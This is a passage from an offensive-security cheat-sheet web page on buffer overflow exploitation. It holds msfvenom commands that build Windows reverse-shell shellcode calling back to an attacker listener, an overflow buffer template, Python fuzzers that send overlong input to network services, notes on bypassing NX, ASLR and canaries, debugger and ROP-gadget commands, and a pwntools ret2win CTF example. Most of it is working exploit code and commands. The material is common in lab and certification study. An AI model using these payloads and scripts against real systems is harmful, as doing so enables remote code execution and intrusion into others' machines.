msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.111 LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

##############   sample 1 ################################################
#!/usr/bin/python

import socket,sys

if len(sys.argv) != 3:
    print("usage: python fuzzer.py 10.11.1.111 PORT")
    exit(1)

payload = "A" * 1000

ipAddress = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    print "Sending payload"
    s.send(payload)
    print "Done"
    s.close()
except:
    print "Error"
    sys.exit(0)

##############   sample 2 ################################################
#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
</code></pre>
<h4 id="protections-bypasses"><a class="header" href="#protections-bypasses">Protections bypasses</a></h4>
<pre><code class="language-text"># NX - Execution protection
- Ret2libc
https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833
-ROP

# ASLR - Random library positions
- Memory leak to Ret2libc
- ROP

# Canary - Hex end buffer
https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/5085
- Value leak
- Brute force
- Format Strings: https://owasp.org/www-community/attacks/Format_string_attack
</code></pre>
<h4 id="rop"><a class="header" href="#rop">ROP</a></h4>
<pre><code class="language-text">checksec

# Listing functions imported from shared libraries is simple:          
rabin2 -i           

# Strings
rabin2 -z         

# Relocations
rabin2 -R 

# Listing just those functions written by the programmer is harder, a rough approximation could be:          
rabin2 -qs  | grep -ve imp -e ' 0 '          

RADARE2
------------------------------------------
r2 -AAA binary          # Analyze with radare2
afl                     # list functions
pdf @ funcion           # dissassemble function to check what instruction pointer want to reach
iz                      # Strings
is                      # Symbols
px 48 @ 0x00601060      # Hex dump address
dcu 0x00400809          # Breakpoint
    “press s”           # Continue over breakpoint
/R pop rdi              # Search instruction
/a pop rdi,ret          # Search

GDB
------------------------------------------
gdb-gef binary
pattern create 200
pattern search “lalal”
r                       # run
c                       # continue
s                       # step
si                      # step into
b *0x0000000000401850   # Add breakpoint
ib                      # Show breakpoints
d1                      # Remove breakpoint 1
d                       # Remove breakpoint
info functions          # Check functions
x/s 0x400c2f            # Examine address x/&lt;(Mode)Format&gt;  Format:s(tring)/x(hex)/i(nstruction) Mode:l/w


ROPGadget
------------------------------------------
https://github.com/JonathanSalwan/ROPgadget
ROPgadget --binary callme32 --only "mov|pop|ret"

Ropper
------------------------------------------
ropper --file callme32 --search "pop"

readelf -S binary # Check writable locations

x32
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %eax  | %ebx | %ecx | %edx | %esi | %edi | %ebp |

x64
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |

EXAMPLE
------------------------------------------

from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('ret2win')
io = process(elf.path) 
gdb.attach(io)
info("%#x target", elf.symbols.ret2win)

ret2win = p64(elf.symbols["ret2win"])
payload = "A"*40 + ret2win
io.sendline(payload)
io.recvuntil("Here's your flag:")

# Get our flag!
flag = io.recvall()
success(flag)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tools-everywhere"><a class="header" href="#tools-everywhere">tools everywhere</a></h1>
<p><img src="others/../.gitbook/assets/assessment-mindset.png" alt="" /></p>
<p>https://inventory.raw.pm/tools.html</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
